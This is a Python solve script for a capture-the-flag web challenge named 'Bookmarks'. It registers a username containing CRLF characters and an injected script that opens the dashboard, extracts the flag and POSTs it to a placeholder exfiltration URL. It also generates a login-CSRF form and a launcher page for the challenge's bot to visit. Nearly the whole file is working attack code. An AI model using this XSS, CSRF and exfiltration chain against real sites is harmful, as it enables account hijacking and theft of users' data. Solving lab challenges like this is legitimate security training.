"""

    bubu - Solution for Bookmarks challenge 
    https://albertofdr.github.io/
    @alberto_fdr

"""

import string
import random
import requests
from urllib.parse import quote

# Change with remote url
URL = "http://localhost"
URL_FOR_BOT = "http://web"
# Change with you serveo/localhost.run/ngrok or whatever
ATTACKER_URL = "" 
# Change with your requestcatcher or webhook.site
EXFILTRATE_URL = ""
# Change to the real format
FLAG_FORMAT = "/ctf\{.*?\}/g"


# CHALL CLIENT CODE
def register(username, password):
    requests.post(URL + '/register', data={'username': username, 'password': password})


def report(url):
    requests.post(URL + '/report', data={'url': url})


username = "bubu\r\n\r\n<script>setInterval(function(){a=open('/dashboard');a.onload=function(){if(a.document.body.outerHTML.match(" + FLAG_FORMAT + ")){fetch('" + EXFILTRATE_URL + "?',{method:'POST',body: a.document.body.outerHTML.match(" + FLAG_FORMAT + ")[0]})};a.close()}},1000)</script>" + ''.join(random.choices(string.ascii_letters, k=2)) 
password = "password"


# Open new tab for CSRF
# Open new tab for getting flag
with open('solve.html', 'w') as f:
    f.write("""
    <html>
    <body>
    <script>
        window.open('/csrf.html')
        setTimeout(function(){window.open('""" + URL_FOR_BOT + """/dashboard')}, 1000);
    </script>
    </body></html>""")

# CSRF html
with open('csrf.html', 'w') as f:
    f.write(f"""
    <html><body>
    <form id="loginForm" action="{URL_FOR_BOT}/login" method="POST">
        <input type="hidden" name="username" value="{username}">
        <input type="hidden" name="password" value="{password}">
    </form> """ + """
    <script>
        window.onload = function() {
            document.getElementById('loginForm').submit();
        };
    </script>
    </body></html>
    """)


print(f"[USERNAME] {quote(username)} \n[PASSWORD] {password}")

register(username, password)
report(ATTACKER_URL + '/solve.html') 
